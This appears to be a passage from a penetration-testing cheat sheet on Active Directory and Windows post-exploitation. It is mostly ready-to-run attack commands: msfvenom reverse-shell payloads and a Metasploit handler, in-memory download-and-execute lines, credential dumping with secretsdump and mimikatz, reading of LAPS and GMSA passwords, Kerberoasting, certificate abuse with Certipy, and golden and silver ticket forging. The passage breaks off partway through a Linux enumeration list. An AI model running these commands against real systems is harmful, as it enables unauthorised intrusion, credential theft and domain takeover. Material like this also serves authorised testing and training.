<pre><code class="language-c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f exe -o &lt;FILE&gt;.exe
</code></pre>
<pre><code class="language-c">msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST &lt;LHOST&gt;
LHOST =&gt; &lt;LHOST&gt;
msf6 exploit(multi/handler) &gt; set LPORT &lt;LPORT&gt;
LPORT =&gt; &lt;LPORT&gt;
msf6 exploit(multi/handler) &gt; run
</code></pre>
<pre><code class="language-c">.\&lt;FILE&gt;.exe
</code></pre>
<pre><code class="language-c">meterpreter &gt; download *
</code></pre>
<h3>Post Exploitation</h3>
<h3>ADCSTemplate</h3>
<pre><code class="language-c">Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '&lt;DOMAIN&gt;\Domain Users'
</code></pre>
<h4>BloodHound</h4>
<pre><code class="language-c">pip install bloodhound
sudo apt-get install neo4j
sudo apt-get install bloodhound
</code></pre>
<h5>Installing and starting Database</h5>
<pre><code class="language-c">wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo echo 'deb https://debian.neo4j.com stable 4.0' &gt; /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get install neo4j
systemctl start neo4j
</code></pre>
<pre><code class="language-c">sudo neo4j start console
sudo bloodhound --no-sandbox
</code></pre>
<blockquote>
<p>http://localhost:7474/browser/</p>
</blockquote>
<h6>Docker Container</h6>
<pre><code class="language-c">docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/&lt;PASSWORD&gt; -v $(pwd)/neo4j:/data neo4j:4.4-community
</code></pre>
<h5>Database Password Reset</h5>
<blockquote>
<p>http://localhost:7474/browser/</p>
</blockquote>
<pre><code class="language-c">ALTER USER neo4j SET PASSWORD '&lt;PASSWORD&gt;'
</code></pre>
<h4>BloodHound Python</h4>
<pre><code class="language-c">bloodhound-python -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &quot;&lt;PASSWORD&gt;&quot; -gc &lt;DOMAIN&gt; -c all -ns &lt;RHOST&gt;
bloodhound-python -u &lt;USERNAME&gt; -p '&lt;PASSWORD&gt;' -d &lt;DOMAIN&gt; -ns &lt;RHOST&gt; -c All
bloodhound-python -u &lt;USERNAME&gt; -p '&lt;PASSWORD&gt;' -d &lt;DOMAIN&gt; -dc &lt;RHOST&gt; -ns &lt;RHOST&gt; --dns-tcp -no-pass -c ALL --zip
</code></pre>
<h4>bloodyAD</h4>
<pre><code class="language-c">bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object Users --attr member                                        // Get group members
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object 'DC=&lt;DOMAIN&gt;,DC=local' --attr minPwdLength                 // Get minimum password length policy
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object 'DC=&lt;DOMAIN&gt;,DC=local' --attr msDS-Behavior-Version        // Get AD functional level
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get children 'DC=&lt;DOMAIN&gt;,DC=local' --type user                       // Get all users of the domain
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get children 'DC=&lt;DOMAIN&gt;,DC=local' --type computer                   // Get all computers of the domain
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get children 'DC=&lt;DOMAIN&gt;,DC=local' --type container                  // Get all containers of the domain
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; add uac &lt;USERNAME&gt; DONT_REQ_PREAUTH                                   // Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; remove uac &lt;USERNAME&gt; ACCOUNTDISABLE                                  // Disable ACCOUNTDISABLE
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object &lt;USERNAME&gt; --attr userAccountControl                       // Get UserAccountControl flags
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object '&lt;OBJECT&gt;$' --attr msDS-ManagedPassword                    // Read GMSA account password
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object '&lt;OBJECT&gt;$' --attr ms-Mcs-AdmPwd                           // Read LAPS password
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object 'DC=&lt;DOMAIN&gt;,DC=local' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; add dnsRecord &lt;RECORD&gt; &lt;LHOST&gt;                                        // Add a new DNS entry
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; remove dnsRecord &lt;RECORD&gt; &lt;LHOST&gt;                                     // Remove a DNS entry
bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get dnsDump                                                           // Get AD DNS records
</code></pre>
<h4>Certify</h4>
<blockquote>
<p>https://github.com/GhostPack/Certify</p>
</blockquote>
<pre><code class="language-c">.\Certify find /vulnerable
.\Certify.exe find /vulnerable /currentuser
</code></pre>
<h4>Certipy</h4>
<blockquote>
<p>https://github.com/ly4k/Certipy</p>
</blockquote>
<blockquote>
<p>https://github.com/ly4k/BloodHound/</p>
</blockquote>
<pre><code class="language-c">certipy find -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
certipy find -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -vulnerable -stdout
</code></pre>
<h5>Account Creation</h5>
<pre><code class="language-c">certipy account create -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -dc-ip &lt;RHOST&gt; -dns &lt;DOMAIN_CONTROLLER_DNS_NAME&gt; -user &lt;COMPUTERNAME&gt;
</code></pre>
<h5>Authentication</h5>
<pre><code class="language-c">certipy auth -pfx &lt;FILE&gt;.pfx -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt; -domain &lt;DOMAIN&gt;
</code></pre>
<h6>LDAP-Shell</h6>
<pre><code class="language-c">certipy auth -pfx &lt;FILE&gt;.pfx -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt; -domain &lt;DOMAIN&gt; -ldap-shell
</code></pre>
<pre><code class="language-c"># add_user &lt;USERNAME&gt;
# add_user_to_group &lt;GROUP&gt;
</code></pre>
<h5>Certificate Forging</h5>
<pre><code class="language-c">certipy template -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -template Web -dc-ip &lt;RHOST&gt; -save-old
</code></pre>
<h5>Certificate Request</h5>
<p>Run the following command twice because of a current issue with <code>certipy</code>.</p>
<pre><code class="language-c">certipy req -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -ca &lt;CA&gt; -target &lt;FQDN&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt;
</code></pre>
<pre><code class="language-c">certipy req -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -ca &lt;CA&gt; -target &lt;FQDN&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt; -upn &lt;USERNAME&gt;@&lt;DOMAIN&gt; -dns &lt;FQDN&gt;
certipy req -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -ca &lt;CA&gt; -target &lt;FQDN&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt; -upn &lt;USERNAME&gt;@&lt;DOMAIN&gt; -dns &lt;FQDN&gt; -debug
</code></pre>
<h5>Revert Changes</h5>
<pre><code class="language-c">certipy template -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt; -configuration &lt;TEMPLATE&gt;.json
</code></pre>
<h5>Start BloodHound Fork</h5>
<pre><code class="language-c">./BloodHound --disable-gpu-sandbox
</code></pre>
<h4>enum4linux-ng</h4>
<pre><code class="language-c">enum4linux-ng -A &lt;RHOST&gt;
</code></pre>
<h4>Evil-WinRM</h4>
<pre><code class="language-c">evil-winrm -i &lt;RHOST&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;
evil-winrm -i &lt;RHOST&gt; -c /PATH/TO/CERTIFICATE/&lt;CERTIFICATE&gt;.crt -k /PATH/TO/PRIVATE/KEY/&lt;KEY&gt;.key -p -u -S
</code></pre>
<h4>Impacket</h4>
<pre><code class="language-c">impacket-atexec -k -no-pass &lt;DOMAIN&gt;/Administrator@&lt;DOMAIN_CONTROLLER&gt;.&lt;DOMAIN&gt; 'type C:\PATH\TO\FILE\&lt;FILE&gt;'
impacket-GetADUsers -all -dc-ip &lt;RHOST&gt; &lt;DOMAIN&gt;/
impacket-getST &lt;DOMAIN&gt;/&lt;USERNAME&gt;$ -spn WWW/&lt;DOMAIN_CONTROLLER&gt;.&lt;DOMAIN&gt; -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
impacket-lookupsid &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;
impacket-netview &lt;DOMAIN&gt;/&lt;USERNAME&gt; -targets /PATH/TO/FILE/&lt;FILE&gt;.txt -users /PATH/TO/FILE/&lt;FILE&gt;.txt
impacket-reg &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD:PASSWORD_HASH&gt;@&lt;RHOST&gt; &lt;ACTION&gt; &lt;ACTION&gt;
impacket-rpcdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;
impacket-samrdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;
impacket-services &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt; &lt;ACTION&gt;
impacket-smbpasswd &lt;RHOST&gt;/&lt;USERNAME&gt;:'&lt;PASSWORD&gt;'@&lt;RHOST&gt; -newpass '&lt;PASSWORD&gt;'
impacket-smbserver local . -smb2support
</code></pre>
<h5>impacket-smbclient</h5>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
impacket-smbclient &lt;RHOST&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;
impacket-smbclient -k &lt;RHOST&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt;.&lt;RHOST&gt; -no-pass
</code></pre>
<h5>impacket-getTGT</h5>
<pre><code class="language-c">impacket-getTGT &lt;RHOST&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;
impacket-getTGT &lt;RHOST&gt;/&lt;USERNAME&gt; -dc-ip &lt;RHOST&gt; -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
</code></pre>
<h5>impacket-GetNPUsers</h5>
<pre><code class="language-c">impacket-GetNPUsers &lt;RHOST&gt;/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers &lt;RHOST&gt;/&lt;USERNAME&gt; -request -no-pass -dc-ip &lt;RHOST&gt;
impacket-GetNPUsers &lt;RHOST&gt;/ -usersfile usernames.txt -format john -outputfile hashes
</code></pre>
<h5>impacket-getUserSPNs</h5>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
impacket-GetUserSPNs &lt;RHOST&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -k -dc-ip &lt;RHOST&gt;.&lt;RHOST&gt; -no-pass -request
</code></pre>
<h5>impacket-secretsdump</h5>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
impacket-secretsdump &lt;RHOST&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt;
impacket-secretsdump -k &lt;RHOST&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt;.&lt;RHOST&gt; -no-pass -debug
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
impacket-secretsdump -dc-ip &lt;RHOST&gt; &lt;RHOST&gt;.LOCAL/svc_bes:&lt;PASSWORD&gt;@&lt;RHOST&gt;
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
</code></pre>
<h5>impacket-psexec</h5>
<pre><code class="language-c">impacket-psexec &lt;USERNAME&gt;@&lt;RHOST&gt;
impacket-psexec &lt;RHOST&gt;/administrator@&lt;RHOST&gt; -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
</code></pre>
<h5>impacket-ticketer</h5>
<h6>Requirements</h6>
<ul>
<li>Valid User</li>
<li>NTHASH</li>
<li>Domain-SID</li>
</ul>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain &lt;RHOST&gt; -spn MSSQLSVC/&lt;RHOST&gt;.&lt;RHOST&gt; -user-id 500 Administrator
</code></pre>
<h5>Fixing [-] exceptions must derive from BaseException</h5>
<h6>Issue</h6>
<pre><code class="language-c">impacket-GetUserSPNs &lt;RHOST&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -k -dc-ip &lt;DOMAIN_CONTROLLER&gt;.&lt;RHOST&gt; -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
</code></pre>
<h6>How to fix it</h6>
<pre><code class="language-c">241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
</code></pre>
<h5>dacledit.py</h5>
<blockquote>
<p>https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py</p>
</blockquote>
<pre><code class="language-c">$ python3 dacledit.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -k -target-dn 'DC=&lt;DOMAIN&gt;,DC=&lt;DOMAIN&gt;' -dc-ip &lt;RHOST&gt; -action read -principal '&lt;USERNAME&gt;' -target '&lt;GROUP&gt;' -debug
</code></pre>
<h6>Fixing msada_guids Error</h6>
<pre><code class="language-c">#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
</code></pre>
<p>Then put the <code>msada_guids.py</code> into the same directory as <code>dacledit.py</code></p>
<blockquote>
<p>https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py</p>
</blockquote>
<h5>owneredit.py</h5>
<blockquote>
<p>https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py</p>
</blockquote>
<pre><code class="language-c">$ python3 owneredit.py -k '&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;' -dc-ip &lt;RHOST&gt; -action write -new-owner '&lt;USERNAME&gt;' -target '&lt;GROUP&gt;' -debug
</code></pre>
<h4>JAWS</h4>
<pre><code class="language-c">IEX(New-Object Net.webclient).downloadString('http://&lt;LHOST&gt;:&lt;LPORT&gt;/jaws-enum.ps1')
</code></pre>
<h4>Kerberos</h4>
<blockquote>
<p>https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</p>
</blockquote>
<h5>General Notes</h5>
<ul>
<li>Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).</li>
<li>Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).</li>
<li>Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).</li>
</ul>
<h5>Bruteforce</h5>
<pre><code class="language-c">./kerbrute -domain &lt;DOMAIN&gt; -users &lt;FILE&gt; -passwords &lt;FILE&gt; -outputfile &lt;FILE&gt;
</code></pre>
<h6>With List of Users</h6>
<pre><code class="language-c">.\Rubeus.exe brute /users:&lt;FILE&gt; /passwords:&lt;FILE&gt; /domain:&lt;DOMAIN&gt; /outfile:&lt;FILE&gt;
</code></pre>
<h6>Check Passwords for all Users in Domain</h6>
<pre><code class="language-c">.\Rubeus.exe brute /passwords:&lt;FILE&gt; /outfile:&lt;FILE&gt;
</code></pre>
<h5>ASPREPRoast</h5>
<h6>Check ASPREPRoast for all Domain Users (Credentials required)</h6>
<pre><code class="language-c">impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -request -format hashcat -outputfile &lt;FILE&gt;
impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -request -format john -outputfile &lt;FILE&gt;
</code></pre>
<h6>Check ASPREPRoast for a List of Users (No Credentials required)</h6>
<pre><code class="language-c">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile &lt;FILE&gt; -format hashcat -outputfile &lt;FILE&gt;
impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile &lt;FILE&gt; -format john -outputfile &lt;FILE&gt;
</code></pre>
<h6>Check ASPREPRoast for all Domain Users in Domain</h6>
<pre><code class="language-c">.\Rubeus.exe asreproast  /format:hashcat /outfile:&lt;FILE&gt;
</code></pre>
<h5>Kerberoasting</h5>
<pre><code class="language-c">impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -outputfile &lt;FILE&gt;
.\Rubeus.exe kerberoast /outfile:&lt;FILE&gt;
iex (new-object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&quot;)
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII &lt;FILE&gt;
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII &lt;FILE&gt;
</code></pre>
<h5>Overpass The Hash/Pass The Key (PTK)</h5>
<h6>Request TGT with Hash</h6>
<pre><code class="language-c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt; -hashes &lt;LMHASH&gt;:&lt;NTLMHASH&gt;
</code></pre>
<h6>Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)</h6>
<pre><code class="language-c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt; -aesKey &lt;KEY&gt;
</code></pre>
<h6>Request TGT with Password</h6>
<pre><code class="language-c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;
</code></pre>
<h6>Set TGT for Impacket Usage</h6>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
</code></pre>
<h6>Execute Remote Commands</h6>
<pre><code class="language-c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
</code></pre>
<h6>Ask and inject the Ticket</h6>
<pre><code class="language-c">.\Rubeus.exe asktgt /domain:&lt;DOMAIN&gt; /user:&lt;USERNAME&gt; /rc4:&lt;NTLMHASH&gt; /ptt
</code></pre>
<h6>Execute a CMD on Remote Host</h6>
<pre><code class="language-c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd
</code></pre>
<h5>Pass The Ticket (PTT)</h5>
<h6>Harvest Tickets from Linux</h6>
<h6>Check Type and Location of Tickets</h6>
<pre><code class="language-c">grep default_ccache_name /etc/krb5.conf
</code></pre>
<ul>
<li>If none return, default is FILE:/tmp/krb5cc_%{uid}</li>
<li>In Case of File Tickets it is possible to Copy-Paste them to use them</li>
<li>In Case of being KEYRING Tickets, the Tool tickey can be used to get them</li>
<li>To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes</li>
<li>To inject, the Ticket have to be copied in a reachable Folder by all Users</li>
</ul>
<pre><code class="language-c">cp tickey /tmp/tickey
/tmp/tickey -i
</code></pre>
<h6>Harvest Tickets from Windows</h6>
<pre><code class="language-c">sekurlsa::tickets /export
.\Rubeus dump
</code></pre>
<h6>Convert Tickets dumped with Rubeus into base64</h6>
<pre><code class="language-c">[IO.File]::WriteAllBytes(&quot;&lt;TICKET&gt;.kirbi&quot;, [Convert]::FromBase64String(&quot;&lt;TICKET&gt;&quot;))
</code></pre>
<h6>Convert Tickets between Linux and Windows Format with ticket_converter.py</h6>
<blockquote>
<p>https://github.com/Zer1t0/ticket_converter</p>
</blockquote>
<pre><code class="language-c">python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
</code></pre>
<h6>Using Ticket on Linux</h6>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
</code></pre>
<h6>Execute Remote Commands by using TGT</h6>
<pre><code class="language-c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
</code></pre>
<h6>Using Ticket on Windows</h6>
<h6>Inject Ticket with mimikatz</h6>
<pre><code class="language-c">kerberos::ptt &lt;KIRBI_FILE&gt;
</code></pre>
<h6>Inject Ticket with Rubeus</h6>
<pre><code class="language-c">.\Rubeus.exe ptt /ticket:&lt;KIRBI_FILE&gt;
</code></pre>
<h6>Execute a CMD on Remote Host</h6>
<pre><code class="language-c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd
</code></pre>
<h5>Silver Ticket</h5>
<h6>Impacket Examples</h6>
<h6>Generate TGS with NTLM</h6>
<pre><code class="language-c">python ticketer.py -nthash &lt;NTLMHASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -spn &lt;SPN&gt;  &lt;USERNAME&gt;
</code></pre>
<h6>Generate TGS with aesKey</h6>
<pre><code class="language-c">python ticketer.py -aesKey &lt;KEY&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -spn &lt;SPN&gt;  &lt;USERNAME&gt;
</code></pre>
<h6>Set the ticket for impacket use</h6>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
</code></pre>
<h6>Execute Remote Commands by using TGT</h6>
<pre><code class="language-c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
</code></pre>
<h5>mimikatz Examples</h5>
<h6>Generate TGS with NTLM</h6>
<pre><code class="language-c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /rc4:&lt;NTLMHASH&gt; /user:&lt;USERNAME&gt; /service:&lt;SERVICE&gt; /target:&lt;RHOST&gt;
</code></pre>
<h6>Generate TGS with AES 128bit Key</h6>
<pre><code class="language-c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes128:&lt;KEY&gt; /user:&lt;USERNAME&gt; /service:&lt;SERVICE&gt; /target:&lt;RHOST&gt;
</code></pre>
<h6>Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)</h6>
<pre><code class="language-c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes256:&lt;KEY&gt; /user:&lt;USERNAME&gt; /service:&lt;SERVICE&gt; /target:&lt;RHOST&gt;
</code></pre>
<h6>Inject TGS with Mimikatz</h6>
<pre><code class="language-c">kerberos::ptt &lt;KIRBI_FILE&gt;
</code></pre>
<h5>Rubeus Examples</h5>
<pre><code class="language-c">.\Rubeus.exe ptt /ticket:&lt;KIRBI_FILE&gt;
</code></pre>
<h6>Execute CMD on Remote Host</h6>
<pre><code class="language-c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd
</code></pre>
<h5>Golden Ticket</h5>
<h6>Impacket Examples</h6>
<h6>Generate TGT with NTLM</h6>
<pre><code class="language-c">python ticketer.py -nthash &lt;KRBTGT_NTLM_HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt;  &lt;USERNAME&gt;
</code></pre>
<h6>Generate TGT with aesKey</h6>
<pre><code class="language-c">python ticketer.py -aesKey &lt;KEY&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt;  &lt;USERNAME&gt;
</code></pre>
<h6>Set TGT for Impacket Usage</h6>
<pre><code class="language-c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache
</code></pre>
<h6>Execute Remote Commands by using TGT</h6>
<pre><code class="language-c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass
</code></pre>
<h5>mimikatz Examples</h5>
<h6>Generate TGT with NTLM</h6>
<pre><code class="language-c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /rc4:&lt;KRBTGT_NTLM_HASH&gt; /user:&lt;USERNAME&gt;
</code></pre>
<h6>Generate TGT with AES 128bit Key</h6>
<pre><code class="language-c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes128:&lt;KEY&gt; /user:&lt;USERNAME&gt;
</code></pre>
<h6>Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)</h6>
<pre><code class="language-c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes256:&lt;KEY&gt; /user:&lt;USERNAME&gt;
</code></pre>
<h6>Inject TGT with Mimikatz</h6>
<pre><code class="language-c">kerberos::ptt &lt;KIRBI_FILE&gt;
</code></pre>
<h5>Rubeus Examples</h5>
<h6>Inject Ticket with Rubeus</h6>
<pre><code class="language-c">.\Rubeus.exe ptt /ticket:&lt;KIRBI_FILE&gt;
</code></pre>
<h6>Execute CMD on Remote Host</h6>
<pre><code class="language-c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd
</code></pre>
<h6>Get NTLM from Password</h6>
<pre><code class="language-c">python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;&lt;PASSWORD&gt;&quot;.encode(&quot;utf-16le&quot;)).digest())'
</code></pre>
<h4>ldapsearch</h4>
<pre><code class="language-c">ldapsearch -x -H ldap://&lt;RHOST&gt; -D '' -w '' -b &quot;DC=&lt;RHOST&gt;,DC=local&quot;
ldapsearch -x -H ldap://&lt;RHOST&gt; -D '' -w '' -b &quot;DC=&lt;RHOST&gt;,DC=local&quot; | grep descr -A 3 -B 3
ldapsearch -x -h &lt;RHOST&gt; -s base namingcontexts
ldapsearch -x -h &lt;RHOST&gt; -b &quot;dc=&lt;RHOST&gt;,dc=local&quot; &quot;*&quot; | awk '/dn: / {print $2}'
ldapsearch -x -h &lt;RHOST&gt; -D &quot;&lt;USERNAME&gt;&quot; -b &quot;dc=&lt;DOMAIN&gt;,dc=local&quot; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd
ldapsearch -H ldap://&lt;RHOST&gt; -D &lt;USERNAME&gt; -w &quot;&lt;PASSWORD&gt;&quot; -b &quot;CN=Users,DC=&lt;RHOST&gt;,DC=local&quot; | grep info
</code></pre>
<h4>Linux</h4>
<h5>Basic Linux Enumeration</h5>
<pre><code class="language-c">id
sudo -l
uname -a
cat /etc/hosts
cat /etc/fstab
cat /etc/passwd
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
ls -la /opt
